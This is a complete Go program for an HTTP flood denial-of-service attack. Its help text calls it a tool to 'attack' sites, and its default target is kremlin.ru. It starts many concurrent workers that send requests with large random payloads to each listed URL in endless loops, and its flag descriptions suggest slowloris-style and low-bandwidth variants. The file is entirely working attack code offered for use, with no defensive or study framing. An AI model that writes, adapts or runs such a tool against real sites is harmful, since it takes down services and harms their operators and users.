package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	neturl "net/url"
	"os"
	"sync"
	"time"
)

type Site struct {
	url      string
	workers  int
	active   map[int]bool
	requests int
	errors   int
	mutex    sync.Mutex
}

var (
	client            *http.Client
	sites             []*Site
	delay             time.Duration
	maxWorkersPerSite int
	HTTPMethod        *string
	payloadLength     *int
	errorFile         *os.File
)

func init() {
	keepAlive := flag.Bool("keep-alive", true, "Whether to use keep-alive connections (true), or initiate new TCP connection on each request (false)")
	workers := flag.Int("workers", 20, "Number of workers per URL")
	sitesFile := flag.String("sites-file", "./sites.txt", "Path to file with URLs, each on a new line")
	site := flag.String("site", "https://kremlin.ru", "Site URL to attack")
	delayFlag := flag.Int("delay", 0, "Sleep time in milliseconds between each request per worker. Can be increased for keep-alive attacks similar to slowloris")
	HTTPMethod = flag.String("method", "GET", "HTTP method to use. Use HEAD for low bandwidth attacks")
	payloadLength = flag.Int("payload-length", 1024, "Payload length in kilobytes. Random content payload is attached to each request. Disable payload with value 0")
	errorFilename := flag.String("error-file", "/dev/null", "Where to write all errors encountered. File is truncated on each execution")
	flag.Parse()

	delay = time.Duration(*delayFlag) * time.Millisecond
	maxWorkersPerSite = *workers

	var err error
	sites, err = loadSitesFromFile(*sitesFile)
	if err != nil {
		_, err := neturl.ParseRequestURI(*site)
		if err != nil {
			log.Fatal(err)
		}

		sites = []*Site{&Site{
			url:    *site,
			active: make(map[int]bool),
		}}
	}

	errorFile, err = os.Create(*errorFilename)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Unable to open error file: %s\n", err)
		os.Exit(1)
	}

	tr := &http.Transport{
		DisableKeepAlives:  !*keepAlive,
		DisableCompression: true,
		IdleConnTimeout:    0,
	}

	client = &http.Client{
		Transport: tr,
	}
}

func loadSitesFromFile(filename string) ([]*Site, error) {
	f, err := os.Open(filename)
	if err != nil {
		return nil, err
	}

	sites := []*Site{}
	input := bufio.NewScanner(f)
	for input.Scan() {
		url := input.Text()
		_, err := neturl.ParseRequestURI(url)
		if err != nil {
			log.Fatal(err)
		}

		sites = append(sites, &Site{
			url:    url,
			active: make(map[int]bool),
		})
	}
	return sites, nil
}

func newRequest(url string, payload io.Reader) (*http.Request, error) {
	r, err := http.NewRequest(*HTTPMethod, url, payload)
	if err != nil {
		return nil, err
	}

	r.Header.Add("Cache-Control", "no-cache")
	r.Header.Add("Accept-Encoding", "identity")
	r.Header.Add("User-Agent", "fptn")

	return r, nil
}

func newPayloadReader() *bytes.Reader {
	buf := make([]byte, (*payloadLength)*1024)
	rand.Read(buf)
	return bytes.NewReader(buf)
}

func runWorker(id int, site *Site) {
	site.workers++

	// Errors in a row without any successfull request
	errors := 0

	handleRequestError := func(err error) {
		site.mutex.Lock()
		site.errors++
		delete(site.active, id)
		site.mutex.Unlock()

		errors++
		fmt.Fprintf(errorFile, "[%s] %s\n", site.url, err)
		time.Sleep(time.Duration(errors) * time.Second)
	}

	payload := newPayloadReader()

	for {
		payload.Seek(0, 0)
		req, err := newRequest(site.url, payload)
		if err != nil {
			handleRequestError(err)
			continue
		}

		resp, err := client.Do(req)
		if err != nil {
			handleRequestError(err)
			continue
		}

		errors = 0

		site.mutex.Lock()
		site.active[id] = true
		site.requests++
		site.mutex.Unlock()

		// Read body content and close body so TCP connection
		// is reused by next requests (if keep-alive enabled).
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		time.Sleep(delay)
	}
}

func printStatus() {
	for {
		fmt.Printf("\033[H\033[2J")
		fmt.Printf("==> fptn attack <==\n\n")
		fmt.Printf("Workers\tReqs\tErrors\tURL\n")

		for _, site := range sites {
			fmt.Printf("%d/%d\t%d\t%d\t%s\n",
				len(site.active), site.workers,
				site.requests, site.errors, site.url)
		}
		time.Sleep(100 * time.Millisecond)
	}
}

func main() {
	var wg sync.WaitGroup

	go printStatus()

	for i := 0; i < maxWorkersPerSite; i++ {
		for _, site := range sites {
			go runWorker(i, site)
			wg.Add(1)
			time.Sleep(120 * time.Millisecond)
		}
	}

	wg.Wait()
}
